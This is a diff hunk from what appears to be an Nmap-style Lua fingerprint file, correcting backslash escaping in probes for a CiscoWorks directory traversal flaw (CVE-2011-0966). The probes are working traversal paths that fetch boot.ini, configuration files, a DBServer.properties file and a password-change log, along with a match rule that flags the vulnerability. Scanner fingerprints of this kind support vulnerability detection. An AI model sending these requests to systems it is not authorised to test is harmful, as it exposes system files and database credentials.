@@ -2778,10 +2778,10 @@ table.insert(fingerprints, {
 table.insert(fingerprints, {
         category='attacks',
         probes={
-                {path='/cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini', method='GET'},
-                {path='/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties', method='GET'},
-                {path='/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties', method='GET'},
-                {path='/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\log\dbpwdChange.log', method='GET'}
+                {path='/cwhp/auditLog.do?file=..\\..\\..\\..\\..\\..\\..\\boot.ini', method='GET'},
+                {path='/cwhp/auditLog.do?file=..\\..\\..\\..\\..\\..\\..\\Program%20Files\\CSCOpx\\MDC\\Tomcat\\webapps\\triveni\\WEB-INF\\classes\\schedule.properties', method='GET'},
+                {path='/cwhp/auditLog.do?file=..\\..\\..\\..\\..\\..\\..\\Program%20Files\\CSCOpx\\lib\\classpath\\com\\cisco\\nm\\cmf\\dbservice2\\DBServer.properties', method='GET'},
+                {path='/cwhp/auditLog.do?file=..\\..\\..\\..\\..\\..\\..\\Program%20Files\\CSCOpx\\log\\dbpwdChange.log', method='GET'}
         },
         matches={
           {match='boot loader', output='CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)'},
